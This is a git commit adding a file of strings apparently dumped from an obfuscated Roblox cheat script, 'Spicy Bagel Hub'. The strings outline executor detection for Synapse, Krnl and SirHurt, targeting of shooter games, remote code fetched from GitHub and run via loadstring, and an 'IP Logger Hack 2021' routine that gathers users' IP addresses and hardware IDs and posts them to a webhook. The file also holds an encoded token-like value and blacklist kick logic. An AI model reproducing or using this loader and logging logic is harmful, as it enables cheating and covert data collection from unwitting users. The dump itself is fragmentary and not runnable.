c44cb35c34b6e41fad2b5097af3daf90e3f691f5
Te1amon <72522683+nuldylan@users.noreply.github.com>
2021-07-02 20:46:03 -0400

    Create sussy.lua

---
+++ sussy.lua
@@ -0,0 +1,494 @@
+[string "
+..."]:5: attempt to call field '?' (a nil value)
+
+
+This script has been dumped using Telamons Lua Dumper
+
+getexecutorname
+game
+Shutdown
+getgenv
+print
+warn
+error
+rconsoleprint
+hookfunction
+_G
+Loaded
+FasterLoading
+Players
+LocalPlayer
+Kick
+
+Error Code: 7, 
+discord.gg/erdtnTSgng For Help
+a
+b
+c
+d
+e
+f
+g
+h
+i
+j
+k
+l
+m
+n
+o
+p
+q
+r
+s
+t
+u
+v
+w
+x
+y
+z
+!
+@
+#
+$
+%
+^
+&
+*
+(
+)
+-
+_
+=
++
+,
+<
+.
+>
+/
+?
+;
+:
+'
+"
+[
+]
+{
+}
+ 
+pairs
+string
+upper
+math
+random
+Anal_Beeds
+isfile
+SpicyFirstTime.lua
+Spicy_Bagel_Hub.Spicy_File
+pcall
+
+Error Code: 10, 
+Please Rejoin, 
+discord.gg/erdtnTSgng For Help
+Arsenal
+Bad_Business
+Bad Business
+Big_Paintball
+BIG Paintball!
+Counter_Blox
+Counter Blox
+Nerf_FPS
+Foam FPS
+Phantom_Forces
+Phantom Forces
+Tiny_Tanks
+Tiny Tanks!
+Unit_1968
+Unit 1968
+Unit_Classified
+Unit: Classified
+Games
+table
+insert
+Executor: Unknown
+KRNL_LOADED
+KRNL
+syn
+Synapse Xen
+is_sirhurt_closure
+SirHurt
+Exploit: Unknown, Use Synapse, Sirhurt or Krnl
+123
+664
+694
+201
+Spicy_Bagel_Hub_NEW.Spicy_File
+
+Error Code: 4, 
+discord.gg/erdtnTSgng For Help
+GetService
+HttpService
+JSONDecode
+request
+http_request
+Url
+https://httpbin.org/get
+Method
+GET
+Body
+Syn-Fingerprint
+Exploit-Guid
+Proto-User-Identifier
+Sentinel-Fingerprint
+headers
+TEFTM_5hZFZMc3ZIckh0_Fl2STJjdHpPM2xrRG9EcUw0YytyQ_pvMHBBaG9B_Hd4cEluemZGOU4vcjUwT_dXcVRkZFRMTXFpTnVEN1p6YlRIL1c3dHE3OEptTHNwZmVPYlZIbTRxeFF0bjcyNjR0dVVEVHpLaGMydjZwcmRleEIwRkVMS0tCVnhCNmVyT3pG__1rM01nSmEzRlVGQXdSS_xGR3RmeEl3UjY4b_Jzc1NsaGVDdVE9PXxMaTBMd_RrSE44YjZ4K2Js[4nlJ_S9BclB3KytEV2VqOFJxcHB2a2Nl_mdBd3hhVlcyN1hCU0l0NjNDd1VMVURxV0tPV_RrT1E9PXxMd_VrZU00dG9pTCtSdFRo
+gsub
+a7513
+W
+[4
+POST
+Headers
+Content-Type
+application/json
+JSONEncode
+name
+content
+IP Blacklist 
+Name
+embeds
+title
+color
+0
+footer
+text
+IP Logger Hack 2021
+author
+fields
+Game:
+value
+PlaceId
+Exploit:
+IP:
+HWID:
+Failed To Get HWID
+timestamp
+format
+%d-%d-%dT%02d:%02d:%02dZ
+os
+date
+!*t
+time
+year
+month
+day
+hour
+min
+sec
+type
+
+Error Code: 13, 
+discord.gg/erdtnTSgng For Help
+loadstring
+HttpGet
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Black/
+tostring
+No Reason Givin
+
+Error Code: IP BLACKLIST
+ discord.gg/erdtnTSgng
+Reason Givin: 
+HWID Blacklist 
+
+Error Code: HWID BLACKLIST
+ discord.gg/erdtnTSgng
+Reason Givin: 
+UnSupported
+DE719438-3913-47CA-A81C-F5E7FC78303B
+
+Error Code: 12, 
+discord.gg/erdtnTSgng For Help
+split
+
+Error Code: 3, 
+discord.gg/erdtnTSgng For Help
+tonumber
+
+Error Code: 2, 
+discord.gg/erdtnTSgng For Help
+readfile
+Spicy 
+
+Error Code: 1, 
+discord.gg/erdtnTSgng For Help
+writefile
+
+Error Code: 11, 
+Please Rejoin, 
+discord.gg/erdtnTSgng For Help
+SCYCHKTRU
+SPRINSNlocaCHC1337
+@Eryon_ys_tru
+ast6322w34kldfu
+find
+
+Error _G Encrytion Failed
+if This Keeps Happening Report it To The Discord
+https://discord.gg/erdtnTSgng
+GetChildren
+The3bakers
+ChildAdded
+Connect
+AutoHub
+
+Error Code: 8, 
+discord.gg/erdtnTSgng For Help
+CoastingLibrary
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/UI.lua
+SpicyCoastingUI.lua
+
+Error Code: 9, 
+discord.gg/erdtnTSgng For Help
+Emojis
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Emojis.lua
+SpicyEmojis.lua
+loadfile
+Error Code: 9, /ndiscord.gg/erdtnTSgng For Help
+PhantomForcesQuotes
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/PhantomForcesEndGameQuotes.lua
+SpicyPhantomForcesQuotes.lua
+TableToString
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/TabelToString.lua
+SpicyTableToString.lua
+Spicy Bagel Hub
+By: The3Bakers#4565
+Retard
+RunService
+Stepped
+Wait
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Spicy-Bagel-Hub/Games/
+.lua
+Spicy
+pcall
+wait
+spawn
+game
+Shutdown
+spawn
+game
+Players
+LocalPlayer
+Kick
+spawn
+pcall
+wait
+spawn
+game
+Shutdown
+spawn
+game
+Players
+LocalPlayer
+Kick
+spawn
+pcall
+wait
+spawn
+game
+Shutdown
+spawn
+game
+Players
+LocalPlayer
+Kick
+spawn
+pcall
+wait
+spawn
+game
+Shutdown
+spawn
+game
+Players
+LocalPlayer
+Kick
+spawn
+pcall
+wait
+spawn
+game
+Shutdown
+spawn
+game
+Players
+LocalPlayer
+Kick
+spawn
+delfile
+SpicyFirstTime.lua
+delfile
+Spicy_Bagel_Hub.Spicy_File
+tostring
+game
+HttpService
+JSONDecode
+HttpGet
+https://httpbin.org/ip
+origin
+game
+HttpGet
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Black/
+tostring
+game
+HttpGet
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Black/
+tostring
+syn
+request
+http_request
+Url
+Method
+POST
+Headers
+Content-Type
+application/json
+Body
+game
+HttpService
+JSONEncode
+name
+content
+Players
+LocalPlayer
+Name
+:
+embeds
+title
+color
+0
+footer
+text
+IP Logger Hack 2021
+author
+fields
+Game:
+value
+PlaceId
+Exploit:
+IP:
+HWID:
+Failed To Get HWID
+Join Script:
+game:GetService('TeleportService'):TeleportToPlaceInstance(
+,'
+JobId
+')
+Kick Text:
+_G
+Anal_Beeds
+timestamp
+string
+format
+%d-%d-%dT%02d:%02d:%02dZ
+os
+date
+!*t
+time
+year
+month
+day
+hour
+min
+sec
+type
+table
+Kick
+
+Error Code: 13, 
+discord.gg/erdtnTSgng For Help
+tostring
+game
+HttpService
+JSONDecode
+HttpGet
+https://httpbin.org/ip
+origin
+pairs
+game
+Players
+GetChildren
+LocalPlayer
+Name
+The3bakers
+Shutdown
+Instance
+new
+ScreenGui
+Name
+game
+HttpService
+GenerateGUID
+Parent
+CoreGui
+Frame
+AnchorPoint
+Vector2
+BackgroundColor3
+_G
+UIBackgroundColor
+Color3
+fromRGB
+BorderSizePixel
+Position
+UDim2
+Size
+ClipsDescendants
+UIMainColor
+pairs
+TextLabel
+Visible
+BackgroundTransparency
+Text
+tostring
+TextColor3
+TextSize
+LineHeight
+Font
+SourceSans
+GetService
+RunService
+RenderStepped
+Wait
+wait
+coroutine
+wrap
+Destroy
+TextSize
+AnchorPoint
+Vector2
+new
+game
+GetService
+RunService
+RenderStepped
+Wait
+wait
+TextTransparency
+Destroy
+game
+HttpGet
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/UI.lua
+game
+HttpGet
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/Emojis.lua
+game
+HttpGet
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/PhantomForcesEndGameQuotes.lua
+game
+HttpGet
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Functions/TabelToString.lua
+game
+HttpGet
+https://raw.githubusercontent.com/The3Bakers4565/Spicy-Bagel/main/Spicy-Bagel-Hub/Games/
+PlaceId
+.lua
